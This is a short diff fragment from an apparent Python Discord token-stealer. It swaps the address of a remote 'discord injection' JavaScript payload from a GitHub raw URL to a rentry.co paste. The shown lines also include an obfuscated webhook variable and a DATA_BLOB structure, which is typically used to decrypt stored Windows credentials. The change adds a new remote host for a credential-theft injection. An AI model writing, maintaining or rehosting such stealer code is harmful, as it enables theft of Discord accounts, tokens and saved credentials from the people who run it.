@@ -68,7 +68,7 @@ for module in ModuleRequirements:
 
 
 h00k = ""
-inj3c710n_url = f"https://raw.githubusercontent.com/Ayhx187/discord_injection/main/1.js"
+inj3c710n_url = f"https://rentry.co/discord-injection/raw"
 
 class DATA_BLOB(Structure):
     _fields_ = [
